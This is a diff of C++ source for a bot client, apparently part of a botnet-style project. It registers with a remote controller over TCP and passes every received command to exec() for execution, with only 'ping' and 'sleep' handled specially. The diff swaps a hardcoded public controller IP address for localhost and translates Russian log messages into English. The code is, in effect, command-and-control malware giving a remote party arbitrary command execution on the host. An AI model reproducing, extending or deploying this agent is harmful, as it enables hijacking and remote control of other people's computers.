@@ -24,7 +24,7 @@
 
 using namespace std;
 
-const string CONTROLLER_IP = "81.200.153.234";
+const string CONTROLLER_IP = "127.0.0.1";
 const int CONTROLLER_PORT = 12345;
 
 #ifdef _WIN32
@@ -115,10 +115,10 @@ bool register_with_controller(SOCKET& sock) {
         int bytes_received = recv(sock, buffer, sizeof(buffer) - 1, 0);
         if (bytes_received > 0) {
             buffer[bytes_received] = '\0';
-            cout << "Ответ от контроллера: " << buffer << endl;
+            cout << "Response from controller: " << buffer << endl;
         }
         else {
-            cerr << "Ошибка при получении данных от контроллера. Error: " <<
+            cerr << "Error receiving data from controller. Error: " <<
 #ifdef _WIN32
                 WSAGetLastError()
 #else
@@ -137,14 +137,15 @@ bool register_with_controller(SOCKET& sock) {
 }
 
 void execute_command(const string& command) {
-    cout << "Выполняю команду: " << command << endl;
+
+    cout << "Executing command: " << command << endl;
     if (command == "ping") {
         cout << "Bot " << BOT_ID << ": Pong!" << endl;
     }
     else if (command == "sleep") {
         random_device rd;
         mt19937 gen(rd());
-        uniform_int_distribution<> distrib(1, 5); // Диапазон 1-5 секунд
+        uniform_int_distribution<> distrib(1, 5); // Range 1-5 seconds
 
         int sleep_time = distrib(gen);
 
@@ -153,13 +154,12 @@ void execute_command(const string& command) {
         cout << "Bot " << BOT_ID << ": Woke up!" << endl;
     }
     else {
-        cout << "Bot " << BOT_ID << ": Неизвестная команда: " << command << endl;
+        cout << "Bot " << BOT_ID << ": Unknown command: " << command << endl;
     }
 }
 
 
 int main() {
-    setlocale(LC_ALL, "RUS");
 
 #ifdef _WIN32
     if (!initialize_winsock()) {
@@ -192,22 +192,22 @@ int main() {
         if (bytes_received > 0) {
             buffer[bytes_received] = '\0';
             string command(buffer);
-            cout << "Получена команда: " << command << endl;
+            cout << "Received command: " << command << endl;
 
             try {
                 string result = exec(command.c_str());
-                cout << "Результат выполнения команды:\n" << result << endl;
+                cout << "Command execution result:\n" << result << endl;
             }
             catch (const std::runtime_error& e) {
-                cerr << "Ошибка при выполнении команды: " << e.what() << endl;
+                cerr << "Error executing command: " << e.what() << endl;
             }
         }
         else if (bytes_received == 0) {
-            cout << "Контроллер отключился." << endl;
+            cout << "Controller disconnected." << endl;
             break;
         }
         else {
-            cerr << "Ошибка при получении данных. Error: " <<
+            cerr << "Error receiving data. Error: " <<
 #ifdef _WIN32
                 WSAGetLastError()
 #else
